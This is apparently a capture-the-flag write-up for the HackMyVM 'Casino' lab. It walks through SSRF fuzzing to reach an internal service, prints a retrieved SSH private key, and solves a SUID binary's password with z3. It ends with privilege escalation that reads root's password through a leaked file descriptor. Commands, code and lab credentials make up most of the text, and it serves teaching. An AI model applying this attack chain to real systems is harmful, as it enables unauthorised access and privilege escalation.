# Casino

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.182:22
Open 10.0.2.182:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.182
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 3b:20:d0:ba:e2:7a:8a:01:8a:35:3b:52:08:b0:c6:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBChkxiydL7VU9KRiEhoRJa91lEFMFf75/O3kmwYteXO/HUkDV26I/htK65FAfkPVmJt1+y1P6s7o32+49ah0wIg=
|   256 74:76:0a:61:d4:2c:9b:45:36:00:4d:c8:d8:be:0b:89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHtfI395w+LZm/DiPb0vU6ZTTZN/qVfVgGjEwH9IWY1e
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Binary Bet Casino
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/casino/writeup.png)

Register: `test02:test02`

You are given $1000, if you gamble too much and lose all of it you are redirected to 
- [http://10.0.2.182/casino/explainmepls.php?learnabout=en.wikipedia.org/wiki/Russian_roulette](http://10.0.2.182/casino/explainmepls.php?learnabout=en.wikipedia.org/wiki/Russian_roulette)

### SSRF

```bash
└─$ ffuf -u 'http://10.0.2.182/casino/explainmepls.php?learnabout=localhost:FUZZ' -b 'PHPSESSID=po893qgqpkj8c4q09smt9234hh' -w <(seq 1 10000) -fs 1131
80                      [Status: 200, Size: 2269, Words: 576, Lines: 98, Duration: 124ms]
6969                    [Status: 200, Size: 1970, Words: 499, Lines: 81, Duration: 154ms]
```

```bash
└─$ curl 'http://10.0.2.182/casino/explainmepls.php?learnabout=localhost:6969' -b 'PHPSESSID=po893qgqpkj8c4q09smt9234hh' -s | htmlq '#games' | html2markdown
# Casino admins To-Do List
  * Add more games
  * Don't forget the password for the binary
  * Buy a domain
  * Make games harder
  * Secure FTP server
  * Hack into the FBI
  * Buy a sandwich for Wednesday
  * Learn about symbolic execution
  * Develop WannaCry 4.0
  * Help the Colors hacker group to restore their server and make it more secure.
```

```bash
└─$ ffuf -u 'http://10.0.2.182/casino/explainmepls.php?learnabout=localhost:6969/FUZZ' -b 'PHPSESSID=po893qgqpkj8c4q09smt9234hh' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -fs 1131
codebreakers            [Status: 200, Size: 1408, Words: 317, Lines: 65, Duration: 160ms]
```

```bash
└─$ curl 'http://10.0.2.182/casino/explainmepls.php?learnabout=localhost:6969/codebreakers' -b 'PHPSESSID=po893qgqpkj8c4q09smt9234hh' -s | htmlq '#games' | html2markdown
Document Pls Shimmer, dont f*ck this up again... [](./shimmer_rsa)
```

```bash
# localhost:6969/shimmer_rsa
└─$ curl 'http://10.0.2.182/casino/explainmepls.php?learnabout=localhost:6969/shimmer_rsa' -b 'PHPSESSID=po893qgqpkj8c4q09smt9234hh' -s | htmlq '#games' -tw
# Nothing

# localhost:6969/codebreakers/shimmer_rsa
└─$ curl 'http://10.0.2.182/casino/explainmepls.php?learnabout=localhost:6969/codebreakers/shimmer_rsa' -b 'PHPSESSID=po893qgqpkj8c4q09smt9234hh' -s | htmlq '#games' -tw

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## SSH

```bash
└─$ nanp id_rsa.pauline
└─$ chmod 600 id_rsa.shimmer
└─$ ssh -i id_rsa.shimmer shimmer@10.0.2.182
shimmer@casino:~$ id
uid=1001(shimmer) gid=1001(shimmer) grupos=1001(shimmer),100(users)
```

### User.txt

```bash
shimmer@casino:~$ cat user.txt
casinousergobrrr
```

## Privilege Escalation

SUID binary in home
```bash
shimmer@casino:~$ ls -alh pass
-rwsr-xr-x 1 root root 17K jun 14  2023 pass
```

There's a `root.pass` in `/opt`, but unreadable.
```bash
shimmer@casino:/opt$ find . -type f -ls
   653181      4 -rwxr-xr-x   1 www-data www-data      839 jun 13  2023 ./todo-list/index.html
   653183      4 -rwxr-xr-x   1 www-data www-data      277 jun 13  2023 ./todo-list/codebreakers/index.html
   653184      4 -rwxr-xr-x   1 www-data www-data     2602 jun 14  2023 ./todo-list/codebreakers/shimmer_rsa
   653186      4 -rwxr-xr-x   1 www-data www-data       55 jun 13  2023 ./todo-list/styles.css/main.css
   522246      4 -rw-------   1 root     root           15 jun 14  2023 ./root.pass
   522244      0 -rw-r--r--   1 root     root            0 jun 14  2023 ./user.pass
```

```bash
└─$ scp -i id_rsa.shimmer shimmer@10.0.2.182:pass .
```

- [http://dogbolt.org/?id=fa1af75b-ca0d-4ec9-aa37-4320063fa876#Hex-Rays=339](http://dogbolt.org/?id=fa1af75b-ca0d-4ec9-aa37-4320063fa876#Hex-Rays=339)

![writeup-1.png](/assets/pentest/hackmyvm/casino/writeup-1.png)

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

static int checkPasswd(const char * p) {
  if (strlen(p) != 26)
    return 0;

  if (p[0] - p[20] != -10) return 0;
  if (p[1] + p[6] != 208) return 0;
  if (p[2] - p[4] != 10) return 0;
  if (p[3] - p[14] != -2) return 0;
  if (p[4] * p[25] != 10100) return 0;
  if (p[5] + p[17] != 219) return 0;
  if (p[6] - p[10] != -11) return 0;
  if (p[7] - p[20] != -10) return 0;
  if (p[8] * p[17] != 11845) return 0;
  if (p[9] - p[18] != -7) return 0;
  if (p[10] - p[24] != 1) return 0;
  if (p[11] * p[4] != 9797) return 0;
  if (p[12] - p[3] != 3) return 0;
  if (p[13] * p[11] != 11252) return 0;
  if (p[14] - p[13] != -2) return 0;
  if (p[15] != p[23]) return 0;
  if (p[16] - p[8] != -5) return 0;
  if (p[17] * p[7] != 10815) return 0;
  if (p[18] - p[14] != -2) return 0;
  if (p[19] - p[0] != -8) return 0;
  if (p[20] - p[23] != 4) return 0;
  if (p[21] + p[7] != 220) return 0;
  if (p[22] - p[1] != 15) return 0;
  if (p[24] * p[2] != 12654) return 0;
  if (p[25] - p[12] != -15) return 0;

  puts("Correct pass");
  return 1;
}

int main(void) {
  char pass1[100];
  char pass2[100];

  printf("Passwd: ");
  fgets(pass1, sizeof(pass1), stdin);
  pass1[strcspn(pass1, "\n")] = 0;

  if (!checkPasswd(pass1))
    return 0;

  open("/opt/root.pass", O_RDONLY);

  setuid(getuid());

  printf("Second Passwd: ");
  fgets(pass2, sizeof(pass2), stdin);
  pass2[strcspn(pass2, "\n")] = 0;

  if (strcmp(pass2, "ultrasecretpassword") == 0) {
    char * argv[] = {"sh",NULL};
    execvp("/bin/sh", argv);
  } else {
    puts("bye.");
  }

  return 0;
}
```

1. Program requires password
2. If password is valid `root.pass` is opened
3. `root.pass` is never closed
4. If second password is valid **user** shell is spawned
5. If second password is incorrect it quits

Find first password
```python
# pip install z3-solver
from z3 import Solver, BitVec, Or, sat

solver = Solver()

# 1. Create 26 8-bit variables representing each character index
p = password_chars = [BitVec(f'char_at_index_{i}', 8) for i in range(26)]

# 2. Define the bounds for printable ASCII characters (32 to 126)
for character_variable in password_chars:
    solver.add(character_variable >= 32)
    solver.add(character_variable <= 126)

# 3. Apply the mathematical constraints from the source code
solver.add(p[0]  - p[20] == -10)
solver.add(p[1]  + p[6]  == 208)
solver.add(p[2]  - p[4]  == 10)
solver.add(p[3]  - p[14] == -2)
solver.add(p[4]  * p[25] == 10100)
solver.add(p[5]  + p[17] == 219)
solver.add(p[6]  - p[10] == -11)
solver.add(p[7]  - p[20] == -10)
solver.add(p[8]  * p[17] == 11845)
solver.add(p[9]  - p[18] == -7)
solver.add(p[10] - p[24] == 1)
solver.add(p[11] * p[4]  == 9797)
solver.add(p[12] - p[3]  == 3)
solver.add(p[13] * p[11] == 11252)
solver.add(p[14] - p[13] == -2)
solver.add(p[15] == p[23])
solver.add(p[16] - p[8]  == -5)
solver.add(p[17] * p[7]  == 10815)
solver.add(p[18] - p[14] == -2)
solver.add(p[19] - p[0]  == -8)
solver.add(p[20] - p[23] == 4)
solver.add(p[21] + p[7]  == 220)
solver.add(p[22] - p[1]  == 15)
solver.add(p[24] * p[2]  == 12654)
solver.add(p[25] - p[12] == -15)

# 4. Loop to find all possible satisfying assignments
solution_count = 0
while solver.check() == sat:
    solution_count += 1
    current_model = solver.model()
    
    # Reconstruct the string from the current model
    solution_chars = [current_model[p[i]].as_long() for i in range(26)]
    current_password = "".join([chr(c) for c in solution_chars])
    
    print(f"Solution #{solution_count}: {current_password}")

    # 5. Create a blocking clause
    # This tells Z3: "Find a solution where NOT (all characters are the same as this one)"
    blocking_clause = [p[i] != solution_chars[i] for i in range(26)]
    
    # We use Or() because if even one character is different, it's a new password
    solver.add(Or(blocking_clause))
```

```bash
shimmer@casino:~$ ./pass
Passwd: ihopethisisastrongpassword
Correct pass
Second Passwd: ultrasecretpassword
$ id
uid=1001(shimmer) gid=1001(shimmer) grupos=1001(shimmer),100(users)
$ ls /proc/self/fd -alh
total 0
dr-x------ 2 shimmer shimmer  0 ene  8 16:59 .
dr-xr-xr-x 9 shimmer shimmer  0 ene  8 16:59 ..
lrwx------ 1 shimmer shimmer 64 ene  8 16:59 0 -> /dev/pts/0
lrwx------ 1 shimmer shimmer 64 ene  8 16:59 1 -> /dev/pts/0
lrwx------ 1 shimmer shimmer 64 ene  8 16:59 2 -> /dev/pts/0
lr-x------ 1 shimmer shimmer 64 ene  8 16:59 3 -> /opt/root.pass
lr-x------ 1 shimmer shimmer 64 ene  8 16:59 4 -> /proc/1596/fd
$ cat /proc/self/fd/3
cat: /proc/self/fd/3: Permiso denegado
$ cat <&3
masteradmin420
```

> Creds: `root:masteradmin420`

```bash
shimmer@casino:~$ su root
Contraseña: masteradmin420
root@casino:/home/shimmer# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```bash
root@casino:/home/shimmer# cat /root/r0ot.txt
symboliclove4u
```
